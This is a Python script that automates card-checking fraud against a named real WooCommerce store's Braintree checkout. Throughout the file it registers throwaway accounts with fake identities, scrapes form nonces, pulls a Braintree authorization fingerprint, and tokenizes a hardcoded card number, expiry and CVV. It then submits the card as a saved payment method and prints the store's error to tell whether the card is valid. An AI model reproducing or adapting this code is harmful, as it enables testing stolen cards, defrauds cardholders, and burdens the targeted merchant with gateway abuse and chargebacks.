import requests
import re
import base64
import json
from user_agent import generate_user_agent
from faker import Faker

f = Faker()
e = f.email()
n = f.name()
r = requests.Session()
u = generate_user_agent()

response = r.get('https://www.dnalasering.com/my-account/', headers={'User-Agent': u})
x = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', response.text)
xp = x.group(1) if x else ''

data = {
    'email': e,
    'wc_order_attribution_source_type': 'typein',
    'wc_order_attribution_referrer': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_utm_source_platform': '(none)',
    'wc_order_attribution_utm_creative_format': '(none)',
    'wc_order_attribution_utm_marketing_tactic': '(none)',
    'wc_order_attribution_session_entry': 'https://www.dnalasering.com/my-account/payment-methods/',
    'wc_order_attribution_session_start_time': '2026-05-27 03:41:14',
    'wc_order_attribution_session_pages': '3',
    'wc_order_attribution_session_count': '1',
    'wc_order_attribution_user_agent': u,
    'woocommerce-register-nonce': xp,
    '_wp_http_referer': '/my-account/',
    'register': 'Register',
}

response = r.post('https://www.dnalasering.com/my-account/', headers={
    'authority': 'www.dnalasering.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.dnalasering.com',
    'referer': 'https://www.dnalasering.com/my-account/',
    'user-agent': u,
}, data=data)

response = r.get('https://www.dnalasering.com/my-account/edit-address/billing/', headers={'User-Agent': u})
xxl = re.search(r'name="woocommerce-edit-address-nonce" value="([^"]+)"', response.text)
xxp = xxl.group(1) if xxl else ''

headers = {
    'authority': 'www.dnalasering.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.dnalasering.com',
    'referer': 'https://www.dnalasering.com/my-account/edit-address/billing/',
    'user-agent': u,
}
data = {
    'billing_first_name': n,
    'billing_last_name': n,
    'billing_company': '',
    'billing_country': 'US',
    'billing_address_1': 'Hollow park city 49',
    'billing_address_2': '',
    'billing_city': 'New york',
    'billing_state': 'NY',
    'billing_postcode': '10080',
    'billing_phone': '3164394561',
    'billing_email': e,
    'save_address': 'Save address',
    'woocommerce-edit-address-nonce': xxp,
    '_wp_http_referer': '/my-account/edit-address/billing/',
    'action': 'edit_address',
}

response = r.post(
    'https://www.dnalasering.com/my-account/edit-address/billing/',
    cookies=r.cookies,
    headers=headers,
    data=data,
)

site = r.get('https://www.dnalasering.com/my-account/add-payment-method/', headers={'User-Agent': u})
xox = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', site.text)
xoxp = xox.group(1) if xox else ''

wwp = re.search(r'client_token_nonce":"([^"]+)"', site.text)
if not wwp:
    wwp = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)\\u0022', site.text)
xpython = wwp.group(1) if wwp else ''

ajax_data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': xpython,
}
ajax_resp = r.post('https://www.dnalasering.com/wp-admin/admin-ajax.php',
                   headers={
                       'User-Agent': u,
                       'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'X-Requested-With': 'XMLHttpRequest',
                       'Origin': 'https://www.dnalasering.com',
                       'Referer': 'https://www.dnalasering.com/my-account/add-payment-method/',
                   },
                   data=ajax_data)

decoded = base64.b64decode(ajax_resp.json()['data']).decode('utf-8')
auth_fingerprint = json.loads(decoded).get('authorizationFingerprint')

json_graphql = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': '4097583127278530',
                'expirationMonth': '10',
                'expirationYear': '2030',
                'cvv': '889',
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

response = r.post('https://payments.braintree-api.com/graphql', headers={
    'authority': 'payments.braintree-api.com',
    'authorization': f'Bearer {auth_fingerprint}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'user-agent': u,
}, json=json_graphql)

data = response.json()
cvv = data['data']['tokenizeCreditCard']['token']

headers = {
    'authority': 'www.dnalasering.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.dnalasering.com',
    'referer': 'https://www.dnalasering.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': u,
}

data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'visa'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', cvv),
    ('wc_braintree_device_data', '{}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'USD'),
    ('wc_braintree_paypal_locale', 'en_us'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', xoxp),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]

response = r.post('https://www.dnalasering.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)

wx = re.search(r'<ul class="woocommerce-error"[^>]*>(.*?)</ul>', response.text, re.DOTALL)
if wx:
    wxx = re.sub(r'<[^>]+>', '', wx.group(1)).strip()
    print(wxx)